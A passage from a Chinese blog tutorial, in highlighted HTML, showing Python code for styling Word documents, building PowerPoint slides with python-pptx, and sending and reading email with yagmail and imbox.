punctuation">(</span>records<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">)</span>doc<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'shili.docx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="修改样式"><a href="#修改样式" class="headerlink" title="修改样式"></a>修改样式</h3><h4 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> docx <span class="token keyword">import</span> Document<span class="token keyword">from</span> docx<span class="token punctuation">.</span>shared <span class="token keyword">import</span> Pt<span class="token punctuation">,</span>RGBColor<span class="token keyword">from</span> docx<span class="token punctuation">.</span>oxml<span class="token punctuation">.</span>ns <span class="token keyword">import</span> qndoc<span class="token operator">=</span>Document<span class="token punctuation">(</span><span class="token string">'1.docx'</span><span class="token punctuation">)</span><span class="token keyword">for</span> paragraph <span class="token keyword">in</span> doc<span class="token punctuation">.</span>paragraphs<span class="token punctuation">:</span>    <span class="token keyword">for</span> run <span class="token keyword">in</span> paragraph<span class="token punctuation">.</span>runs<span class="token punctuation">:</span>        run<span class="token punctuation">.</span>font<span class="token punctuation">.</span>bold<span class="token operator">=</span><span class="token boolean">True</span>        run<span class="token punctuation">.</span>font<span class="token punctuation">.</span>italic<span class="token operator">=</span><span class="token boolean">True</span>        run<span class="token punctuation">.</span>font<span class="token punctuation">.</span>underline<span class="token operator">=</span><span class="token boolean">True</span>        run<span class="token punctuation">.</span>font<span class="token punctuation">.</span>strike<span class="token operator">=</span><span class="token boolean">True</span>        run<span class="token punctuation">.</span>font<span class="token punctuation">.</span>shadow<span class="token operator">=</span><span class="token boolean">True</span>        run<span class="token punctuation">.</span>font<span class="token punctuation">.</span>size<span class="token operator">=</span><span class="token boolean">True</span>        run<span class="token punctuation">.</span>font<span class="token punctuation">.</span>color<span class="token punctuation">.</span>rgb<span class="token operator">=</span>RGBColor<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#设置中文字体样式需要借助qn模块</span>run<span class="token punctuation">.</span>font<span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string">'微软雅黑'</span>r<span class="token operator">=</span>run<span class="token punctuation">.</span>_element<span class="token punctuation">.</span>rPr<span class="token punctuation">.</span>rFontsr<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span>qn<span class="token punctuation">(</span><span class="token string">'w:eastAsia'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'微软雅黑'</span><span class="token punctuation">)</span>doc<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'1.docx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="段落"><a href="#段落" class="headerlink" title="段落"></a>段落</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> docx<span class="token punctuation">.</span>enum<span class="token punctuation">.</span>text <span class="token keyword">import</span> WD_ALIGN_PARAGRAPHparagraph<span class="token punctuation">.</span>alignment<span class="token operator">=</span>WD_ALIGN_PARAGRAPH<span class="token punctuation">.</span>CENTER<span class="token comment">#可选的对齐方式 LEFT,CENTER,RIGHT,JUSTIFY,DISTRIBUTE,JUSTIFY_MED,JUSTIFY_HI,JUSTIFY_LOW,THAIJUSTIFY</span>paragraph<span class="token punctuation">.</span>paragraph_format<span class="token punctuation">.</span>line_spacing<span class="token operator">=</span><span class="token number">2.0</span>   <span class="token comment">#调整行间距，要用浮点数表示，2.0表示两倍行间距</span>paragraph<span class="token punctuation">.</span>paragraph_format<span class="token punctuation">.</span>space_before<span class="token operator">=</span>Pt<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment">#段前间距12磅</span>paragraph<span class="token punctuation">.</span>paragraph_format<span class="token punctuation">.</span>space_after<span class="token operator">=</span>Pt<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="处理PPT文件"><a href="#处理PPT文件" class="headerlink" title="处理PPT文件"></a>处理PPT文件</h2><h3 id="PPT文档结构"><a href="#PPT文档结构" class="headerlink" title="PPT文档结构"></a>PPT文档结构</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_blog/python-auto-f3.png"></p><h3 id="读取内容"><a href="#读取内容" class="headerlink" title="读取内容"></a>读取内容</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pptx <span class="token keyword">import</span> Presentationprs<span class="token operator">=</span>Presentation<span class="token punctuation">(</span><span class="token string">'1.pptx'</span><span class="token punctuation">)</span><span class="token keyword">for</span> slide <span class="token keyword">in</span> prs<span class="token punctuation">.</span>slides<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>slide<span class="token punctuation">)</span>    <span class="token keyword">for</span> shape <span class="token keyword">in</span> slide<span class="token punctuation">.</span>shapes<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>shape<span class="token punctuation">)</span>        <span class="token keyword">if</span> shape<span class="token punctuation">.</span>has_text_frame<span class="token punctuation">:</span>            <span class="token comment">#判断是否有文字</span>            text_frame<span class="token operator">=</span>shape<span class="token punctuation">.</span>text_frame     <span class="token comment">#获取文字框</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>text_frame<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            <span class="token keyword">for</span> paragraph <span class="token keyword">in</span> text_frame<span class="token punctuation">.</span>paragraphs<span class="token punctuation">:</span>     <span class="token comment">#获取paragraph中的段落</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>paragraph<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="母版概念"><a href="#母版概念" class="headerlink" title="母版概念"></a>母版概念</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_blog/python-auto-f4.png"></p><h3 id="查看母版信息"><a href="#查看母版信息" class="headerlink" title="查看母版信息"></a>查看母版信息</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pptx <span class="token keyword">import</span> Presentationprs<span class="token operator">=</span>Presentation<span class="token punctuation">(</span><span class="token string">'1.pptx'</span><span class="token punctuation">)</span>slide<span class="token operator">=</span>prs<span class="token punctuation">.</span>slides<span class="token punctuation">.</span>add_slide<span class="token punctuation">(</span>prs<span class="token punctuation">.</span>slide_layouts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment">#获取第一个母版，并用第一个母版生成一页PPT </span><span class="token keyword">for</span> shape <span class="token keyword">in</span> slide<span class="token punctuation">.</span>placeholders<span class="token punctuation">:</span>                    <span class="token comment">#获取这一页所有的占位符</span>    phf<span class="token operator">=</span>shape<span class="token punctuation">.</span>placeholder_format    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>phf<span class="token punctuation">.</span>idx<span class="token punctuation">&#125;</span></span><span class="token string">--</span><span class="token interpolation"><span class="token punctuation">&#123;</span>shape<span class="token punctuation">.</span>name<span class="token punctuation">&#125;</span></span><span class="token string">--</span><span class="token interpolation"><span class="token punctuation">&#123;</span>phf<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    shape<span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>phf<span class="token punctuation">.</span>idx<span class="token punctuation">&#125;</span></span><span class="token string">--</span><span class="token interpolation"><span class="token punctuation">&#123;</span>phf<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>prs<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'test.pptx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="根据占位符ID填写内容"><a href="#根据占位符ID填写内容" class="headerlink" title="根据占位符ID填写内容"></a>根据占位符ID填写内容</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pptx <span class="token keyword">import</span> Presentationprs<span class="token operator">=</span>Presentation<span class="token punctuation">(</span><span class="token string">'1.pptx'</span><span class="token punctuation">)</span>slide<span class="token operator">=</span>prs<span class="token punctuation">.</span>slides<span class="token punctuation">.</span>add_slide<span class="token punctuation">(</span>prs<span class="token punctuation">.</span>slide_layouts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    winner_name<span class="token operator">=</span>slide<span class="token punctuation">.</span>placeholders<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>certificate_type<span class="token operator">=</span>slide<span class="token punctuation">.</span>placeholders<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>this_is_to_certify_that<span class="token operator">=</span>slide<span class="token punctuation">.</span>placeholders<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span>winning_reason<span class="token operator">=</span>slide<span class="token punctuation">.</span>placeholders<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span>winner_name<span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token string">'Han Meimei'</span>certificate_type<span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token string">'三好学生奖状'</span>this_is_to_certify_that<span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token string">'兹证明'</span>winning_reason<span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token string">'学习好，身体好'</span>prs<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'test.pptx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="添加段落"><a href="#添加段落" class="headerlink" title="添加段落"></a>添加段落</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pptx <span class="token keyword">import</span> Presentationprs<span class="token operator">=</span>Presentation<span class="token punctuation">(</span><span class="token string">'1.pptx'</span><span class="token punctuation">)</span>slide<span class="token operator">=</span>prs<span class="token punctuation">.</span>slides<span class="token punctuation">.</span>add_slide<span class="token punctuation">(</span>prs<span class="token punctuation">.</span>slide_layouts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    shapes<span class="token operator">=</span>slide<span class="token punctuation">.</span>shapestitle_shape<span class="token operator">=</span>shapes<span class="token punctuation">.</span>titlebody_shape<span class="token operator">=</span>shapes<span class="token punctuation">.</span>placeholders<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>title_shape<span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token string">'title'</span>tf<span class="token operator">=</span>body_shape<span class="token punctuation">.</span>text_frametf<span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token string">'p1'</span>p<span class="token operator">=</span>tf<span class="token punctuation">.</span>add_paragraph<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token string">'p2'</span>p<span class="token punctuation">.</span>level<span class="token operator">=</span><span class="token number">1</span>                   <span class="token comment">#设定层级关系，默认最高层级为0级</span>p<span class="token operator">=</span>tf<span class="token punctuation">.</span>add_paragraph<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token string">'p3'</span>p<span class="token punctuation">.</span>level<span class="token operator">=</span><span class="token number">2</span>prs<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'test.pptx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="添加一个文本框"><a href="#添加一个文本框" class="headerlink" title="添加一个文本框"></a>添加一个文本框</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pptx <span class="token keyword">import</span> Presentation<span class="token keyword">from</span> pptx<span class="token punctuation">.</span>util <span class="token keyword">import</span> Cm<span class="token punctuation">,</span>Ptprs<span class="token operator">=</span>Presentation<span class="token punctuation">(</span><span class="token string">'1.pptx'</span><span class="token punctuation">)</span>slide<span class="token operator">=</span>prs<span class="token punctuation">.</span>slides<span class="token punctuation">.</span>add_slide<span class="token punctuation">(</span>prs<span class="token punctuation">.</span>slide_layouts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    left<span class="token operator">=</span>top<span class="token operator">=</span>width<span class="token operator">=</span>height<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>                 <span class="token comment">#距离上下左右多少cm</span>text_box<span class="token operator">=</span>slide<span class="token punctuation">.</span>shapes<span class="token punctuation">.</span>add_textbox<span class="token punctuation">(</span>left<span class="token punctuation">,</span>top<span class="token punctuation">,</span>width<span class="token punctuation">,</span>height<span class="token punctuation">)</span>tf<span class="token operator">=</span>text_box<span class="token punctuation">.</span>text_frametf<span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token string">'words in the text box'</span>p<span class="token operator">=</span>tf<span class="token punctuation">.</span>add_paragraph<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token string">"second paragraph bold font-size is 40"</span>p<span class="token punctuation">.</span>font<span class="token punctuation">.</span>bold<span class="token operator">=</span><span class="token boolean">True</span>p<span class="token punctuation">.</span>font<span class="token punctuation">.</span>size<span class="token operator">=</span>Pt<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span>prs<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'test.pptx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="添加图片"><a href="#添加图片" class="headerlink" title="添加图片"></a>添加图片</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pptx <span class="token keyword">import</span> Presentation<span class="token keyword">from</span> pptx<span class="token punctuation">.</span>util <span class="token keyword">import</span> Cmprs<span class="token operator">=</span>Presentation<span class="token punctuation">(</span><span class="token string">'1.pptx'</span><span class="token punctuation">)</span>slide<span class="token operator">=</span>prs<span class="token punctuation">.</span>slides<span class="token punctuation">.</span>add_slide<span class="token punctuation">(</span>prs<span class="token punctuation">.</span>slide_layouts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    left<span class="token operator">=</span>top<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>                 pic<span class="token operator">=</span>slide<span class="token punctuation">.</span>shapes<span class="token punctuation">.</span>add_picture<span class="token punctuation">(</span><span class="token string">'landscape.jpg'</span><span class="token punctuation">,</span>left<span class="token punctuation">,</span>top<span class="token punctuation">)</span>left<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>height<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">5.5</span><span class="token punctuation">)</span>pic<span class="token operator">=</span>slide<span class="token punctuation">.</span>shapes<span class="token punctuation">.</span>add_picture<span class="token punctuation">(</span><span class="token string">'landscape.jpg'</span><span class="token punctuation">,</span>left<span class="token punctuation">,</span>top<span class="token punctuation">,</span>height<span class="token operator">=</span>height<span class="token punctuation">)</span>prs<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'test.pptx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="添加表格"><a href="#添加表格" class="headerlink" title="添加表格"></a>添加表格</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pptx <span class="token keyword">import</span> Presentation<span class="token keyword">from</span> pptx<span class="token punctuation">.</span>util <span class="token keyword">import</span> Cmprs<span class="token operator">=</span>Presentation<span class="token punctuation">(</span><span class="token string">'1.pptx'</span><span class="token punctuation">)</span>slide<span class="token operator">=</span>prs<span class="token punctuation">.</span>slides<span class="token punctuation">.</span>add_slide<span class="token punctuation">(</span>prs<span class="token punctuation">.</span>slide_layouts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   shapes<span class="token operator">=</span>slide<span class="token punctuation">.</span>shapes rows<span class="token punctuation">,</span>cols<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span>left<span class="token operator">=</span>top<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>                 width<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span>height<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>table<span class="token operator">=</span>shapes<span class="token punctuation">.</span>add_table<span class="token punctuation">(</span>rows<span class="token punctuation">,</span>cols<span class="token punctuation">,</span>left<span class="token punctuation">,</span>top<span class="token punctuation">,</span>width<span class="token punctuation">,</span>height<span class="token punctuation">)</span><span class="token punctuation">.</span>tabletable<span class="token punctuation">.</span>columns<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>width<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>table<span class="token punctuation">.</span>columns<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>width<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>table<span class="token punctuation">.</span>rows<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>height<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>records<span class="token operator">=</span><span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'grade'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token string">'Li lei'</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token string">'Han meimei'</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token string">'Ma dongmei'</span><span class="token punctuation">,</span><span class="token number">98</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token keyword">for</span> row <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>rows<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> col <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>cols<span class="token punctuation">)</span><span class="token punctuation">:</span>        table<span class="token punctuation">.</span>cell<span class="token punctuation">(</span>row<span class="token punctuation">,</span>col<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>records<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">)</span>prs<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'test.pptx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="文本框样式"><a href="#文本框样式" class="headerlink" title="文本框样式"></a>文本框样式</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pptx <span class="token keyword">import</span> Presentation<span class="token keyword">from</span> pptx<span class="token punctuation">.</span>util <span class="token keyword">import</span> Cm<span class="token keyword">from</span> pptx<span class="token punctuation">.</span>enum<span class="token punctuation">.</span>text <span class="token keyword">import</span> MSO_ANCHOR<span class="token punctuation">,</span>MSO_AUTO_SIZE<span class="token keyword">from</span> pptx<span class="token punctuation">.</span>dml<span class="token punctuation">.</span>color <span class="token keyword">import</span> RGBColor<span class="token keyword">from</span> pptx<span class="token punctuation">.</span>enum<span class="token punctuation">.</span>text <span class="token keyword">import</span> PP_ALIGNprs<span class="token operator">=</span>Presentation<span class="token punctuation">(</span><span class="token string">'1.pptx'</span><span class="token punctuation">)</span>slide<span class="token operator">=</span>prs<span class="token punctuation">.</span>slides<span class="token punctuation">.</span>add_slide<span class="token punctuation">(</span>prs<span class="token punctuation">.</span>slide_layouts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   left<span class="token operator">=</span>top<span class="token operator">=</span>width<span class="token operator">=</span>height<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>text_box<span class="token operator">=</span>slide<span class="token punctuation">.</span>shapes<span class="token punctuation">.</span>add_textbox<span class="token punctuation">(</span>left<span class="token punctuation">,</span>top<span class="token punctuation">,</span>width<span class="token punctuation">,</span>height<span class="token punctuation">)</span>tf<span class="token operator">=</span>text_box<span class="token punctuation">.</span>text_frametf<span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token string">"text box word"</span>tf<span class="token punctuation">.</span>margin_bottom<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>                                <span class="token comment">#下边距</span>tf<span class="token punctuation">.</span>margin_left<span class="token operator">=</span><span class="token number">0</span>                                        <span class="token comment">#左边距</span>tf<span class="token punctuation">.</span>vertical_anchor<span class="token operator">=</span>MSO_ANCHOR<span class="token punctuation">.</span>BOTTOM                    <span class="token comment">#底端对齐</span>tf<span class="token punctuation">.</span>word_wrap<span class="token operator">=</span><span class="token boolean">True</span>                                       <span class="token comment">#框中的文字自动换行</span>fill<span class="token operator">=</span>text_box<span class="token punctuation">.</span>fillfill<span class="token punctuation">.</span>solid<span class="token punctuation">(</span><span class="token punctuation">)</span>                                            <span class="token comment">#纯色填充</span>fill<span class="token punctuation">.</span>fore_color<span class="token punctuation">.</span>rgb<span class="token operator">=</span>RGBColor<span class="token punctuation">(</span><span class="token number">247</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">)</span>fill<span class="token punctuation">.</span>transparency<span class="token operator">=</span><span class="token number">0.25</span>line<span class="token operator">=</span>text_box<span class="token punctuation">.</span>line                                      <span class="token comment">#边框样式</span>line<span class="token punctuation">.</span>color<span class="token punctuation">.</span>rgb<span class="token operator">=</span>RGBColor<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>line<span class="token punctuation">.</span>width<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>p<span class="token operator">=</span>tf<span class="token punctuation">.</span>add_paragraph<span class="token punctuation">(</span><span class="token punctuation">)</span>                                    <span class="token comment">#段落对齐</span>p<span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token string">"second words"</span>p<span class="token punctuation">.</span>alignment<span class="token operator">=</span>PP_ALIGN<span class="token punctuation">.</span>RIGHTprs<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'test.pptx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h2><h3 id="发送邮件"><a href="#发送邮件" class="headerlink" title="发送邮件"></a>发送邮件</h3><p>邮箱必须开通POP3/SMTP/IMAP，和各服务器域名<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_blog/python-auto-f5.png"><br>使用如下代码在python交互式解释器中存入邮件地址和检验码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> yagmail<span class="token operator">>></span><span class="token operator">></span> yagmail<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token string">'a@163.com'</span><span class="token punctuation">,</span><span class="token string">'检验码'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yagmailyag<span class="token operator">=</span>yagmail<span class="token punctuation">.</span>SMTP<span class="token punctuation">(</span>user<span class="token operator">=</span><span class="token string">'a@163.com'</span><span class="token punctuation">,</span>host<span class="token operator">=</span><span class="token string">'smtp.163.com'</span><span class="token punctuation">)</span>contents<span class="token operator">=</span><span class="token punctuation">[</span>    <span class="token string">'first paragraph'</span><span class="token punctuation">,</span>    <span class="token string">'second paragraph'</span><span class="token punctuation">,</span>    <span class="token string">'&lt;a href="https://ezysec.cn">ezy-blog&lt;/a>'</span><span class="token punctuation">,</span>                  <span class="token comment">#发送带有HTML样式的邮件</span>    <span class="token string">'landscape.jpg'</span><span class="token punctuation">,</span>                                             <span class="token comment">#填写本机文件地址即可发送附件</span>    yagmail<span class="token punctuation">.</span>inline<span class="token punctuation">(</span><span class="token string">'landscape.jpg'</span><span class="token punctuation">)</span>                             <span class="token comment">#图片嵌入正文</span><span class="token punctuation">]</span>yag<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a@163.com'</span><span class="token punctuation">,</span><span class="token string">'an-email'</span><span class="token punctuation">,</span>contents<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>如果需要群发，修改yag.send参数即可，yag.send([‘<a href="mailto:&#97;&#64;&#x31;&#54;&#x33;&#x2e;&#x63;&#x6f;&#x6d;">&#97;&#64;&#x31;&#54;&#x33;&#x2e;&#x63;&#x6f;&#x6d;</a>‘,‘<a href="mailto:&#97;&#x40;&#97;&#46;&#x63;&#111;&#x6d;">&#97;&#x40;&#97;&#46;&#x63;&#111;&#x6d;</a>‘],’an-email’,contents)</p></blockquote><h3 id="读取邮件"><a href="#读取邮件" class="headerlink" title="读取邮件"></a>读取邮件</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> keyringpassward<span class="token operator">=</span>keyring<span class="token punctuation">.</span>get_password<span class="token punctuation">(</span><span class="token string">"yagmail"</span><span class="token punctuation">,</span><span class="token string">"a@163.com"</span><span class="token punctuation">)</span>  <span class="token comment">#前提是通过yagmail设置好密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>需要设置允许第三方客户端读取内容<code>http://config.mail.163.com/settings/imap/login.jsp?uid=a@163.com</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> imbox <span class="token keyword">import</span> Imbox<span class="token keyword">import</span> keyringpassword<span class="token operator">=</span>keyring<span class="token punctuation">.</span>get_password<span class="token punctuation">(</span><span class="token string">"yagmail"</span><span class="token punctuation">,</span><span class="token string">"ezy0812@163.com"</span><span class="token punctuation">)</span><span class="token keyword">with</span> Imbox<span class="token punctuation">(</span><span class="token string">'imap.163.com'</span><span class="token punctuation">,</span><span class="token string">'ezy0812@163.com'</span><span class="token punctuation">,</span>password<span class="token punctuation">,</span>ssl<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token keyword">as</span> imbox<span class="token punctuation">:</span>    all_inbox_messages<span class="token operator">=</span>imbox<span class="token punctuation">.</span>messages<span class="token punctuation">(</span><span class="token punctuation">)</span>             <span class="token comment">#不加参数时读取所有邮件</span>    <span class="token keyword">for</span> uid<span class="token punctuation">,</span>message <span class="token keyword">in</span> all_inbox_messages<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>message<span class="token punctuation">.</span>subject<span class="token punctuation">)</span>        <span class="token keyword">print</span><span 